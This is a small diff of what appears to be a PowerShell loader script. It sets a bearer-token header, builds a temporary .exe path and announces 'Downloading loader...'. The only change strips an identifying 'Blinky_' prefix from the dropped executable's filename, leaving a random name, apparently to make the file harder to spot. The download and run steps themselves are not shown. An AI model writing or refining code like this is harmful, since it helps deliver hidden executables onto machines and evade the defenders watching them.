@@ -40,7 +40,7 @@ try {
         Authorization = "Bearer $token"
     }
 
-    $tempExe = Join-Path $env:TEMP ("Blinky_" + [System.Guid]::NewGuid().ToString().Substring(0,5) + ".exe")
+    $tempExe = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString().Substring(0,5) + ".exe")
 
     Write-Host "[*] Downloading loader..."
 
